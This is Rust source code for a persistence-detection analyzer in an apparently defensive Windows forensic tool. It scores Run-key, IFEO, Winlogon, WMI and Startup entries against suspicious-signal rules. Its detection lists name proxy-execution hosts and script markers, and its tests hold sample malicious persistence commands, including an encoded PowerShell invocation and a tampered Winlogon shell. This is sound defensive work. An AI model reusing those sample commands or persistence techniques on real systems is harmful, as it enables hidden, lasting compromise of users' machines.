//! heur_persist (spec §4.2): dispositive-signal gate over persistence records. A record
//! that clears the gate (>=1 rare/dispositive signal) becomes a Finding; everything else
//! is inventory surfaced via `observe()` as an Observation (spec §6).
use crate::score::{build_cross_index, deescalate, escalate, join_key};
use crate::trust::{
    exe_name, invocation_args, invoked_exe, is_interpreter, is_masquerade,
    is_system_or_program_files, is_under_windows_tree, is_user_writable_path, launcher_kind,
    risky_args, script_markers, winlogon_value_is_default, ArgRisk, MarkerKind,
};
use cairn_core::finding::{
    EntityFile, EntityPersistence, EntityProcess, EntityRegistry, EvidenceItem,
};
use cairn_core::observation::Observation;
use cairn_core::record::{ExecutionRecord, Mechanism, PersistenceRecord, Record};
use cairn_core::traits::Analyzer;
use cairn_core::{Entity, Finding, FindingSource, Result, Severity};
use chrono::{DateTime, Duration, Utc};

/// Days within which a LastWrite counts as "recent" (a freshly-planted persistence entry).
const RECENT_DAYS: i64 = 7;

/// One dispositive-signal hit (spec §4.2). `label` feeds the Finding title;
/// `reason` feeds Finding.reason (golden rule 6).
pub(crate) struct GateHit {
    pub severity: Severity,
    pub label: &'static str,
    pub reason: String,
    pub mitre: &'static str,
}

/// S9 (spec §4.2): persistence command invoking a script interpreter.
/// Encoded/remote content -> High; a plain local script file -> Low; else None.
/// The interpreter must be the invoked binary itself (basename of binary_path, or the
/// command's first token) — a substring match would flag "PowerShell Studio\app.exe".
fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
    let cmd = p.command.as_deref()?;
    let invoked = p
        .binary_path
        .as_deref()
        .map(exe_name)
        .or_else(|| invoked_exe(cmd))?;
    if !is_interpreter(&invoked) {
        return None;
    }
    let lower = cmd.to_ascii_lowercase();
    let payload = script_markers(cmd)
        .iter()
        .any(|m| matches!(m.kind, MarkerKind::Encoded | MarkerKind::Remote));
    if payload {
        return Some(GateHit {
            severity: Severity::High,
            label: "腳本直譯器持久化（編碼/遠端內容）",
            reason: format!(
                "persistence command runs {invoked} with encoded or remote content: {cmd}"
            ),
            mitre: "T1059",
        });
    }
    const SCRIPT_EXTS: &[&str] = &[".vbs", ".vbe", ".js", ".jse", ".bat", ".ps1", ".hta"];
    if SCRIPT_EXTS.iter().any(|e| lower.contains(e)) {
        return Some(GateHit {
            severity: Severity::Low,
            label: "腳本檔持久化",
            reason: format!("persistence command runs {invoked} against a local script: {cmd}"),
            mitre: "T1059",
        });
    }
    None
}

/// Signed Windows hosts that run or load other code. A persistence entry pointing at
/// one of them is judged by its ARGUMENTS, since the host binary itself is always
/// signed and in System32.
const PROXY_HOSTS: &[(&str, &str)] = &[
    ("rundll32", "T1218.011"),
    ("regsvr32", "T1218.010"),
    ("msiexec", "T1218.007"),
    ("mshta", "T1218.005"),
    ("wscript", "T1059.005"),
    ("cscript", "T1059.005"),
    ("powershell", "T1059.001"),
    ("pwsh", "T1059.001"),
    ("cmd", "T1059.003"),
];

/// S5: proxy execution. The entry runs a signed Windows host (rundll32, regsvr32,
/// msiexec, mshta, wscript, cscript, powershell, cmd) whose argument is a DLL/script in
/// a user-writable folder, a UNC share or a URL -> High. For the interpreters a URL is
/// already S9's encoded/remote hit, so only the path/share arguments count here.
fn proxy_exec_signal(p: &PersistenceRecord) -> Option<GateHit> {
    let cmd = p.command.as_deref()?;
    let path = p.binary_path.as_deref().unwrap_or("");
    let host = if path.is_empty() {
        invoked_exe(cmd)?
    } else {
        exe_name(path)
    };
    let (_, mitre) = PROXY_HOSTS.iter().find(|(h, _)| *h == host)?;
    // Only the real host: a bare name, or a path under the Windows tree. A copy
    // elsewhere is S3's masquerade / S2's drop-zone binary, not proxy execution.
    let absolute = path.get(1..).is_some_and(|r| r.starts_with(":\\"));
    if absolute && !is_under_windows_tree(path) {
        return None;
    }
    // Interpreters (cmd, PowerShell, WSH, mshta): S9 already reports a URL argument.
    let interpreter = is_interpreter(&host);
    let risks: Vec<ArgRisk> = risky_args(invocation_args(cmd))
        .into_iter()
        .filter(|r| !(interpreter && matches!(r, ArgRisk::Url(_))))
        .collect();
    if risks.is_empty() {
        return None;
    }
    let what: Vec<String> = risks.iter().map(ToString::to_string).collect();
    Some(GateHit {
        severity: Severity::High,
        label: "系統程式代理執行（使用者可寫路徑或遠端內容）",
        reason: format!(
            "persistence runs the signed Windows host {host}.exe, which loads {}: {cmd}",
            what.join(", ")
        ),
        mitre,
    })
}

/// Script files Windows runs straight from the Startup folder (through their file
/// association, without naming an interpreter).
const STARTUP_SCRIPT_EXTS: &[&str] = &[
    ".vbs", ".vbe", ".js", ".jse", ".wsf", ".bat", ".cmd", ".ps1", ".hta",
];

/// Shortcut / link files: the Startup entry is a pointer, and its own location (the
/// Startup folder, which Windows puts in AppData/ProgramData) says nothing about the
/// target. Until the collector resolves the target into `binary_path`, such an entry is
/// judged only by its command, never by the shortcut's path.
fn is_unresolved_shortcut(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    [".lnk", ".url", ".pif"].iter().any(|e| lower.ends_with(e))
}

/// The path the generic S2/S3/S4 signals judge: the target binary. Empty (no verdict)
/// for a PowerShell profile (judged by content in crate::asep) and for an unresolved
/// Startup shortcut.
fn signal_path(p: &PersistenceRecord) -> &str {
    let path = p.binary_path.as_deref().unwrap_or("");
    match p.mechanism {
        Mechanism::PsProfile => "",
        Mechanism::Startup if is_unresolved_shortcut(path) => "",
        _ => path,
    }
}

/// Service start type (0 boot, 1 system, 2 auto, 3 demand) as the services
/// collector recorded it; None for other mechanisms or when unknown.
fn service_start_type(p: &PersistenceRecord) -> Option<u32> {
    p.service_start
}

/// Demand-start (Start=3) services run only when something asks for them: a single
/// signal on one is lowered one band. `None` = start type unknown = no adjustment.
fn demand_start_lowers(p: &PersistenceRecord, start_type: Option<u32>, signals: usize) -> bool {
    p.mechanism == Mechanism::Service && start_type == Some(3) && signals == 1
}

/// Evaluate the dispositive-signal gate for one persistence record (spec §4.2).
/// Empty vec = no rare signal = inventory, not a detection (route to Observation).
pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<GateHit> {
    let mut hits = Vec::new();
    let path = p.binary_path.as_deref().unwrap_or("");

    // S1a: winlogon value tampered (default values are inventory).
    if p.mechanism == Mechanism::Winlogon {
        let is_default = p
            .value
            .as_deref()
            .zip(p.command.as_deref())
            .is_some_and(|(v, c)| winlogon_value_is_default(v, c));
        if !is_default {
            hits.push(GateHit {
                severity: Severity::High,
                label: "Winlogon 遭篡改",
                reason: format!(
                    "Winlogon {} is not the stock default: {}",
                    p.value.as_deref().unwrap_or("?"),
                    p.command.as_deref().unwrap_or("-")
                ),
                mitre: "T1547.004",
            });
        }
    }

    // Extended catalog / accessibility IFEO / PowerShell profile signals.
    let asep = crate::asep::asep_signal(p);

    // S1b: IFEO debugger — always gates (rare); severity by target trust. An IFEO on an
    // accessibility binary is the same registry value, described more precisely by the
    // asep hit (T1546.008); counting both would "escalate" one fact as two signals.
    if p.mechanism == Mechanism::Ifeo && asep.is_none() {
        let untrusted = p.signed == Some(false) || is_user_writable_path(path);
        hits.push(GateHit {
            severity: if untrusted {
                Severity::High
            } else {
                Severity::Medium
            },
            label: "IFEO debugger 挾持",
            reason: format!(
                "IFEO Debugger set ({}); target {}",
                p.location,
                if untrusted {
                    "unsigned or in a user-writable path"
                } else {
                    "signed, system/vendor path (Process Explorer-style use)"
                }
            ),
            mitre: "T1546.012",
        });
    }

    // S1c: WMI event subscription persistence. Rare by nature — a normal system has no
    // user-authored WMI permanent event subscriptions — so any binding gates
    // unconditionally, mirroring S1b's "always gate" posture for IFEO. Severity is
    // determined by content inspection because ActiveScriptEventConsumer entries have no
    // invoked executable (binary_path is None by construction — see
    // cairn-collectors::wmi_subscription::extract_binary_path) for S9 to pattern-match
    // against; CommandLineEventConsumer entries (binary_path is Some) are left to the
    // normal S2/S3/S4/S9 checks below instead of an extra unconditional branch here.
    // (CommandLineEventConsumer entries, where binary_path is Some, are deliberately left
    // to the normal S2/S3/S4/S9 checks below rather than an extra unconditional branch
    // here; wmi_subscription must NOT be exempted from the path signals.)
    if p.mechanism == Mechanism::WmiSubscription && p.binary_path.is_none() {
        let content = p.command.as_deref().unwrap_or("");
        let lower = content.to_ascii_lowercase();
        let suspicious = content.contains("Chr(")
            || content.contains("Eval(")
            || content.contains("ExecuteGlobal")
            || content.contains("XMLHTTP")
            || content.contains("WinHttp.WinHttpRequest")
            || lower.contains("http://")
            || lower.contains("https://");
        hits.push(GateHit {
            severity: if suspicious {
                Severity::High
            } else {
                Severity::Medium
            },
            label: "WMI 事件訂閱腳本持久化",
            reason: if suspicious {
                format!(
                    "WMI event subscription runs an inline script referencing dynamic \
                     execution or remote content (no invoked executable exists for S9 \
                     to see): {content}"
                )
            } else {
                format!(
                    "WMI event subscription runs an inline script with no invoked \
                     executable; no obviously suspicious pattern found, but WMI \
                     subscriptions are unusual enough to warrant review: {content}"
                )
            },
            mitre: "T1546.003",
        });
    }

    // Every mechanism, Startup included, is judged by its TARGET binary's signer and
    // path. What is NOT judged is a location Windows itself chose: a PowerShell profile
    // (content-judged in crate::asep) and an unresolved Startup shortcut (.lnk), whose
    // own path is the Startup folder by design (the AnyDesk.lnk false positive).
    let path = signal_path(p);

    hits.extend(asep);

    // S2: unsigned + user-writable drop zone. Some(false) = verified unsigned.
    let s2 = p.signed == Some(false) && is_user_writable_path(path);
    if s2 {
        hits.push(GateHit {
            severity: Severity::High,
            label: "未簽章執行檔於使用者可寫路徑",
            reason: format!(
                "binary is explicitly unsigned and lives in a user-writable drop zone: {path}"
            ),
            mitre: "T1036",
        });
    }

    // S3: system-name masquerade (absolute path outside the name's canonical dir).
    if is_masquerade(path) {
        hits.push(GateHit {
            severity: Severity::High,
            label: "系統程式名稱偽裝",
            reason: format!("system binary name outside its canonical directory: {path}"),
            mitre: "T1036.005",
        });
    }

    // S4: recent + not verified signed + outside system/vendor dirs — all three
    // required. Unsigned (Some(false)) counts like unverifiable (None). Recency ALONE
    // is dead (update-day mass rewrites, per-user service instances). Skipped when S2
    // already reported the same unsigned binary.
    if !s2 && p.signed != Some(true) && !path.is_empty() && !is_system_or_program_files(path) {
        if let Some(lw) = p.last_write {
            let age = now.signed_duration_since(lw);
            if age >= Duration::zero() && age <= Duration::days(RECENT_DAYS) {
                let sig = if p.signed == Some(false) {
                    "unsigned"
                } else {
                    "signature unverifiable"
                };
                hits.push(GateHit {
                    severity: Severity::Medium,
                    label: "近期建立且未簽章或簽章無法驗證",
                    reason: format!(
                        "created/modified within {RECENT_DAYS} days, {sig}, non-system path: {path}"
                    ),
                    mitre: crate::asep::mechanism_mitre(p.mechanism),
                });
            }
        }
    }

    // S5: proxy execution through a signed Windows host.
    let proxy = proxy_exec_signal(p);
    let proxied = proxy.is_some();
    hits.extend(proxy);

    // S6: a script file dropped straight into a Startup folder runs at every logon
    // through its file association.
    if p.mechanism == Mechanism::Startup {
        let lower = path.to_ascii_lowercase();
        if STARTUP_SCRIPT_EXTS.iter().any(|e| lower.ends_with(e)) {
            hits.push(GateHit {
                severity: Severity::Medium,
                label: "啟動資料夾中的腳本檔",
                reason: format!(
                    "script file placed directly in a Startup folder runs at every logon: {path}"
                ),
                mitre: "T1547.001",
            });
        }
    }

    // S9: script-interpreter persistence. Its plain local-script tier (Low) describes
    // the same fact as S5's user-writable script argument, so it is dropped when S5
    // fired; the encoded/remote tier is a separate fact and stays.
    if let Some(hit) = script_persistence_signal(p) {
        if !(proxied && hit.severity == Severity::Low) {
            hits.push(hit);
        }
    }

    hits
}

/// Return the bare file name from a command/path string (strips surrounding quotes too).
fn short_name_persist(path: &str) -> String {
    path.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_owned()
}

/// details starts with the FULL PATH (the investigator's first question), single line,
/// " | " separated — CSV-safe, readable without expanding the HTML row (spec §7.2).
fn gate_details(p: &PersistenceRecord) -> String {
    let path = p
        .binary_path
        .as_deref()
        .filter(|s| !s.is_empty())
        .unwrap_or(&p.location);
    let sig = match p.signed {
        Some(true) => match p.signer.as_deref() {
            Some(s) => format!("已簽章 ({s})"),
            None => "已簽章".into(),
        },
        Some(false) => "未簽章".into(),
        None => "簽章無法驗證".into(),
    };
    let lw = p
        .last_write
        .map(|t| t.format("%Y-%m-%d").to_string())
        .unwrap_or_else(|| "unknown".into());
    format!(
        "{path} | {mech}: {loc}{val} | {sig} | last_write={lw}",
        mech = p.mechanism,
        loc = p.location,
        val = p
            .value
            .as_deref()
            .map(|v| format!(" → {v}"))
            .unwrap_or_default(),
    )
}

/// Evidence for the persistence entry itself.
fn persistence_evidence(p: &PersistenceRecord) -> EvidenceItem {
    EvidenceItem {
        artifact: p.mechanism.to_string(),
        path: p.binary_path.clone(),
        ts: p.last_write,
        detail: format!(
            "{}: {} = {}",
            p.location,
            p.value.as_deref().unwrap_or("-"),
            p.command.as_deref().unwrap_or("-")
        ),
    }
}

/// Evidence rows from execution artifacts (honest about prefetch's filename-only path).
fn execution_evidence(entries: &[&ExecutionRecord]) -> Vec<EvidenceItem> {
    entries
        .iter()
        .map(|e| {
            let mut detail = format!(
                "{}: run_count={} last_run={}",
                e.source,
                e.run_count
                    .map(|c| c.to_string())
                    .unwrap_or_else(|| "?".into()),
                e.last_run
                    .map(|t| t.format("%Y-%m-%dT%H:%M:%SZ").to_string())
                    .unwrap_or_else(|| "unknown".into()),
            );
            if e.source == "prefetch" {
                detail.push_str("（prefetch 僅記錄檔名）");
            }
            EvidenceItem {
                artifact: e.source.clone(),
                path: Some(e.path.clone()),
                ts: e.last_run.or(e.first_run),
                detail,
            }
        })
        .collect()
}

/// True when the entry's binary is a launcher (interpreter / LOLBin / fetch tool):
/// its identity is the command line, not the shared host binary.
fn runs_through_launcher(p: &PersistenceRecord) -> bool {
    p.binary_path
        .as_deref()
        .map(exe_name)
        .filter(|e| !e.is_empty())
        .or_else(|| p.command.as_deref().and_then(invoked_exe))
        .is_some_and(|e| launcher_kind(&e).is_some())
}

/// Lowercase, whitespace runs collapsed, surrounding quotes of the whole string kept:
/// the comparison form of two command lines.
fn collapse_ws(s: &str) -> String {
    s.to_ascii_lowercase()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Total order over Severity for max-selection (Severity itself has no Ord).
fn sev_rank(s: Severity) -> u8 {
    match s {
        Severity::Critical => 4,
        Severity::High => 3,
        Severity::Medium => 2,
        Severity::Low => 1,
        Severity::Info => 0,
    }
}

/// Analyzer: ranks persistence records, emitting findings above the noise floor.
pub struct PersistHeuristic;

impl PersistHeuristic {
    /// This analyzer's `name()`, also stamped into `Finding.analyzer`.
    pub const NAME: &'static str = cairn_core::analyzers::PERSIST;
}

impl Analyzer for PersistHeuristic {
    fn name(&self) -> &str {
        Self::NAME
    }

    fn analyze(&self, records: &[Record], _prior_findings: &[Finding]) -> Result<Vec<Finding>> {
        // NOTE: `observe()` below independently samples its own `now`. The orchestrator
        // calls analyze() then observe() as two separate trait-method calls, so these two
        // timestamps can differ by however long analysis takes. S4's 7-day recency gate
        // is the only signal sensitive to `now`; a record whose age crosses exactly the
        // 7-day boundary during that gap could in theory appear in BOTH findings and
        // observations (or neither). Sharing one timestamp would require threading `now`
        // through the Analyzer trait signature for all six analyzers — out of proportion
        // to a sub-second race on a 7-day window. Accepted residual risk (see
        // docs/REMAINING-WORK.md).
        let now = Utc::now();
        let idx = build_cross_index(records);
        let mut out = Vec::new();
        for r in records {
            let Record::Persistence(p) = r else { continue };
            let hits = evaluate_gate(p, now);
            if hits.is_empty() {
                continue; // inventory — surfaces via observe()
            }

            // Severity: max of hits; >=2 signals escalate once; execution/process
            // corroboration escalates once more (spec §4.1/§4.3). Cap: Critical.
            let mut sev = hits
                .iter()
                .map(|h| h.severity)
                .max_by_key(|s| sev_rank(*s))
                .unwrap_or(Severity::Low);
            let mut reasons: Vec<String> = hits.iter().map(|h| h.reason.clone()).collect();
            if hits.len() >= 2 {
                sev = escalate(sev);
                reasons.push(format!("{} independent signals — escalated", hits.len()));
            }

            let key = join_key(
                p.binary_path
                    .as_deref()
                    .or(p.command.as_deref())
                    .unwrap_or(""),
            );
            let mut evidence = vec![persistence_evidence(p)];
            let (mut exec_hits, exec_degraded) = idx.lookup_exec(&key);
            let (mut proc_hits, proc_degraded) = idx.lookup_proc(&key);
            if runs_through_launcher(p) {
                // The binary is a shared host (powershell, rundll32, cmd, ...): every
                // host on the machine has its prefetch entry and usually a running
                // instance, which says nothing about THIS entry. Only a process
                // running this exact command line corroborates it.
                exec_hits.clear();
                let want = collapse_ws(p.command.as_deref().unwrap_or(""));
                proc_hits.retain(|pr| !want.is_empty() && collapse_ws(&pr.cmdline) == want);
            }
            if !exec_hits.is_empty() || !proc_hits.is_empty() {
                sev = escalate(sev);
                let mut corr = Vec::new();
                let mut any_degraded = false;
                if !exec_hits.is_empty() {
                    corr.push(format!("executed ({} artifact records)", exec_hits.len()));
                    evidence.extend(execution_evidence(&exec_hits));
                    any_degraded |= exec_degraded;
                }
                for pr in &proc_hits {
                    corr.push(format!("currently running (pid={})", pr.pid));
                    evidence.push(EvidenceItem {
                        artifact: "process".into(),
                        path: Some(pr.image.clone()),
                        ts: pr.start_time,
                        detail: format!("running pid={} image={}", pr.pid, pr.image),
                    });
                }
                any_degraded |= !proc_hits.is_empty() && proc_degraded;
                let suffix = if any_degraded {
                    "（降級佐證：僅檔名相符，來源缺完整路徑）"
                } else {
                    ""
                };
                reasons.push(format!(
                    "corroborated: {} — escalated{suffix}",
                    corr.join("; ")
                ));
            }

            let corroborated = !exec_hits.is_empty() || !proc_hits.is_empty();
            if !corroborated && demand_start_lowers(p, service_start_type(p), hits.len()) {
                sev = deescalate(sev);
                reasons.push(
                    "demand-start service (Start=3) runs only when something starts it — \
                     lowered one band"
                        .to_string(),
                );
            }

            let top = hits
                .iter()
                .max_by_key(|h| sev_rank(h.severity))
                .unwrap_or(&hits[0]);
            let short = short_name_persist(
                p.binary_path
                    .as_deref()
                    .or(p.command.as_deref())
                    .unwrap_or(&p.location),
            );
            let mut f = Finding::new(
                sev,
                format!("{}: {short}", top.label),
                FindingSource::Heuristic,
            );
            f.reason = Some(reasons.join("; "));
            f.mitre = {
                // First-seen order, every duplicate dropped (Vec::dedup only drops
                // adjacent ones: [T1036, T1059, T1036] stayed as is).
                let mut m: Vec<String> = Vec::new();
                for h in &hits {
                    if !m.iter().any(|x| x == h.mitre) {
                        m.push(h.mitre.to_string());
                    }
                }
                m
            };
            f.artifact = "persistence".into();
            f.details = gate_details(p);
            f.ts = p.last_write.unwrap_or(now);
            f.entity = persistence_entity(p);
            if let Some(pr) = proc_hits.first() {
                f.entity.process = Some(EntityProcess {
                    pid: pr.pid,
                    ppid: pr.ppid,
                    image: pr.image.clone(),
                    cmdline: pr.cmdline.clone(),
                    signed: pr.signed,
                    integrity: pr.integrity.clone(),
                });
            }
            f.evidence = evidence;
            out.push(f);
        }
        Ok(crate::stamped(out, Self::NAME))
    }

    fn observe(&self, records: &[Record]) -> Result<Vec<Observation>> {
        let now = Utc::now();
        let mut out = Vec::new();
        for r in records {
            let Record::Persistence(p) = r else { continue };
            if !evaluate_gate(p, now).is_empty() {
                continue; // gated items are findings, not inventory
            }
            let category = if p.mechanism == Mechanism::Winlogon {
                "winlogon_default".to_string()
            } else {
                p.mechanism.to_string()
            };
            let short = short_name_persist(
                p.binary_path
                    .as_deref()
                    .or(p.command.as_deref())
                    .unwrap_or(&p.location),
            );
            let mut o = Observation::new(category, format!("{}: {short}", p.mechanism));
            o.ts = p.last_write.unwrap_or(now);
            o.path = p.binary_path.clone();
            o.details = gate_details(p);
            o.source_artifact = "persistence".into();
            out.push(o);
        }
        Ok(out)
    }
}

/// Build the entity: registry-backed mechanisms -> entity.registry; the file-backed
/// `startup` mechanism -> entity.file (SRS §5.1 mapping in the design spec). Always
/// also carries entity.persistence (typed mechanism + location) for the report.
fn persistence_entity(p: &PersistenceRecord) -> Entity {
    let mut entity = location_entity(p);
    entity.persistence = Some(EntityPersistence {
        mechanism: p.mechanism,
        location: p.location.clone(),
    });
    entity
}

/// Where the entry lives: entity.file for file-backed mechanisms, entity.registry
/// (registry key, or the WMI binding) otherwise.
fn location_entity(p: &PersistenceRecord) -> Entity {
    if p.mechanism.is_file_backed() {
        Entity {
            file: Some(EntityFile {
                path: p
                    .binary_path
                    .clone()
                    .or_else(|| p.value.clone())
                    .unwrap_or_default(),
                sha256: None,
                mtime: p.last_write,
            }),
            ..Entity::default()
        }
    } else if p.mechanism == Mechanism::WmiSubscription {
        // WMI subscriptions have no registry key or file path of their own — location
        // holds "<filter> -> <consumer>" (see cairn-collectors::wmi_subscription). Reuse
        // entity.registry's key field for this identifier rather than adding a new Entity
        // sub-object for a single mechanism (schema stays unchanged; the field's semantics
        // — "where this persistence mechanism lives in the system" — already fit).
        Entity {
            registry: Some(EntityRegistry {
                hive: "WMI".to_string(),
                key: p.location.clone(),
                value: p.value.clone().unwrap_or_default(),
                data: p.command.clone().unwrap_or_default(),
                last_write: p.last_write,
            }),
            ..Entity::default()
        }
    } else {
        Entity {
            registry: Some(EntityRegistry {
                hive: hive_prefix(&p.location),
                key: p.location.clone(),
                value: p.value.clone().unwrap_or_default(),
                data: p.command.clone().unwrap_or_default(),
                last_write: p.last_write,
            }),
            ..Entity::default()
        }
    }
}

/// Parse the hive prefix ("HKLM"/"HKCU"/...) from a registry location string; "" if none.
fn hive_prefix(location: &str) -> String {
    location
        .split(['\\', '/'])
        .next()
        .filter(|h| h.starts_with("HK"))
        .unwrap_or("")
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(
        mechanism: Mechanism,
        binary_path: Option<&str>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism,
            location: "HKLM\\...\\Run".into(),
            value: Some("Updater".into()),
            command: binary_path.map(|p| p.to_string()),
            binary_path: binary_path.map(|p| p.to_string()),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write,
            bound: None,
            signer_source: None,
            service_start: None,
        }
    }

    use cairn_core::record::{ProcessRecord, Record};
    use cairn_core::traits::Analyzer;

    /// The analyzer emits one Heuristic finding for a malicious IFEO record (reason +
    /// registry entity) and nothing for a quiet old Run key.
    #[test]
    fn analyzer_emits_finding_for_malicious_only() {
        let now = Utc::now();
        let bad = Record::Persistence(rec(
            Mechanism::Ifeo,
            Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
            Some(now),
        ));
        let quiet = Record::Persistence(rec(
            Mechanism::RunKey,
            Some(r"C:\Program Files\V\a.exe"),
            Some(now - Duration::days(400)),
        ));
        let findings = PersistHeuristic
            .analyze(&[bad, quiet], &[])
            .expect("analyze");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert!(matches!(f.source, cairn_core::FindingSource::Heuristic));
        assert!(f.reason.is_some());
        assert_eq!(f.artifact, "persistence");
        assert!(f.entity.registry.is_some(), "ifeo is registry-backed");
        assert!(f.mitre.contains(&"T1546.012".to_string()));
    }

    /// Every persist Finding carries `analyzer = "heur_persist"` so other analyzers
    /// (netconn) identify persist-originated findings by a typed field.
    #[test]
    fn finding_carries_analyzer_name_for_cross_analyzer_lookup() {
        let now = Utc::now();
        let bad = Record::Persistence(rec(
            Mechanism::Ifeo,
            Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
            Some(now),
        ));
        let findings = PersistHeuristic.analyze(&[bad], &[]).expect("analyze");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].analyzer, PersistHeuristic::NAME);
        assert!(!findings[0]
            .reason
            .as_deref()
            .unwrap_or("")
            .contains("source: heur_persist"));
    }

    /// An S9 execution-corroboration hit (a live ProcessRecord whose image matches the
    /// persistence record's binary_path via join_key) must populate entity.process with
    /// the matched process's fields — not just escalate severity silently.
    #[test]
    fn s9_execution_hit_populates_entity_process() {
        let now = Utc::now();
        let bad = Record::Persistence(rec(
            Mechanism::Ifeo,
            Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
            Some(now),
        ));
        let running = Record::Process(ProcessRecord {
            pid: 4242,
            ppid: 1,
            image: r"C:\Users\victim\AppData\Local\Temp\evil.exe".to_string(),
            cmdline: r"evil.exe -x".to_string(),
            signed: Some(false),
            signer: None,
            binary_sha256: None,
            integrity: Some("Medium".to_string()),
            user: None,
            start_time: None,
            signer_source: None,
        });
        let findings = PersistHeuristic
            .analyze(&[bad, running], &[])
            .expect("analyze");
        assert_eq!(findings.len(), 1);
        let entity_process = findings[0]
            .entity
            .process
            .as_ref()
            .expect("S9 execution hit must populate entity.process");
        assert_eq!(entity_process.pid, 4242);
        assert_eq!(
            entity_process.image,
            r"C:\Users\victim\AppData\Local\Temp\evil.exe"
        );
        assert_eq!(entity_process.cmdline, r"evil.exe -x");
        assert_eq!(entity_process.signed, Some(false));
        assert_eq!(entity_process.integrity, Some("Medium".to_string()));
    }

    /// A startup (file) mechanism populates entity.file, not entity.registry.
    /// Uses an S9 script-persistence signal to clear the gate.
    #[test]
    fn startup_mechanism_uses_file_entity() {
        let now = Utc::now();
        let r = PersistenceRecord {
            mechanism: Mechanism::Startup,
            location: r"C:\Users\a\...\Startup".into(),
            value: Some("Updater".into()),
            command: Some("powershell.exe -NoP -Enc SQBFAFgA".into()),
            binary_path: None,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: Some(now),
            bound: None,
            signer_source: None,
            service_start: None,
        };
        let findings = PersistHeuristic
            .analyze(&[Record::Persistence(r)], &[])
            .expect("analyze");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert!(f.entity.file.is_some());
        assert!(f.entity.registry.is_none());
    }

    // ── gate model (spec §4.2) ───────────────────────────────────────────────
    fn full_rec(
        mechanism: Mechanism,
        value: Option<&str>,
        command: Option<&str>,
        binary_path: Option<&str>,
        signed: Option<bool>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism,
            location: format!("HKLM\\...\\{mechanism}"),
            value: value.map(String::from),
            command: command.map(String::from),
            binary_path: binary_path.map(String::from),
            binary_sha256: None,
            signed,
            signer: None,
            last_write,
            bound: None,
            signer_source: None,
            service_start: None,
        }
    }

    #[test]
    fn gate_s1a_winlogon_tamper_high_default_silent() {
        let now = Utc::now();
        let tampered = full_rec(
            Mechanism::Winlogon,
            Some("Shell"),
            Some("explorer.exe,evil.exe"),
            None,
            None,
            None,
        );
        let hits = evaluate_gate(&tampered, now);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::High);
        assert_eq!(hits[0].mitre, "T1547.004");
        let stock = full_rec(
            Mechanism::Winlogon,
            Some("Shell"),
            Some("explorer.exe"),
            Some(r"C:\Windows\explorer.exe"),
            Some(true),
            Some(now),
        );
        assert!(
            evaluate_gate(&stock, now).is_empty(),
            "stock winlogon must be inventory"
        );
    }

    #[test]
    fn gate_s1b_ifeo_severity_by_target_trust() {
        let now = Utc::now();
        let evil = full_rec(
            Mechanism::Ifeo,
            Some("Debugger"),
            Some(r"C:\Users\a\AppData\Roaming\d.exe"),
            Some(r"C:\Users\a\AppData\Roaming\d.exe"),
            Some(false),
            None,
        );
        assert!(evaluate_gate(&evil, now)
            .iter()
            .any(|h| h.severity == Severity::High));
        let procexp = full_rec(
            Mechanism::Ifeo,
            Some("Debugger"),
            Some(r"C:\Program Files\SysInternals\procexp.exe"),
            Some(r"C:\Program Files\SysInternals\procexp.exe"),
            Some(true),
            None,
        );
        let hits = evaluate_gate(&procexp, now);
        assert_eq!(hits.len(), 1, "IFEO always gates");
        assert_eq!(
            hits[0].severity,
            Severity::Medium,
            "signed vendor target -> Medium"
        );
    }

    #[test]
    fn gate_s2_unsigned_dropzone_high_but_signed_or_normal_path_silent() {
        let now = Utc::now();
        let evil = full_rec(
            Mechanism::RunKey,
            Some("Upd"),
            Some(r"C:\Users\a\AppData\Roaming\e.exe"),
            Some(r"C:\Users\a\AppData\Roaming\e.exe"),
            Some(false),
            None,
        );
        assert_eq!(evaluate_gate(&evil, now)[0].severity, Severity::High);
        // signed chrome autostart -> inventory
        let chrome = full_rec(
            Mechanism::RunKey,
            Some("Chrome"),
            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
            Some(true),
            Some(now),
        );
        assert!(evaluate_gate(&chrome, now).is_empty());
        // unsigned but in Program Files (admin-write) -> not S2
        let pf = full_rec(
            Mechanism::RunKey,
            Some("V"),
            Some(r"C:\Program Files\V\v.exe"),
            Some(r"C:\Program Files\V\v.exe"),
            Some(false),
            None,
        );
        assert!(evaluate_gate(&pf, now).is_empty());
    }

    /// The drop-zone list is the shared trust::USER_WRITABLE_DIRS, which (unlike the
    /// old persist-only list) includes all of AppData\Local: an explicitly unsigned
    /// binary there is the same S2 hit as one in Roaming.
    #[test]
    fn gate_s2_covers_appdata_local_vendor_dirs() {
        let now = Utc::now();
        let p = full_rec(
            Mechanism::RunKey,
            Some("Upd"),
            Some(r"C:\Users\a\AppData\Local\Updater\upd.exe"),
            Some(r"C:\Users\a\AppData\Local\Updater\upd.exe"),
            Some(false),
            None,
        );
        assert!(evaluate_gate(&p, now).iter().any(|h| h.mitre == "T1036"));
    }

    /// An unresolved Startup shortcut is judged by its command, not by the shortcut's
    /// own path (the Startup folder, which Windows places in ProgramData/AppData) —
    /// real-machine e2e regression: AnyDesk.lnk, unsigned .lnk, recent last_write.
    #[test]
    fn gate_startup_shortcut_path_is_not_judged() {
        let now = Utc::now();
        for dir in [
            r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
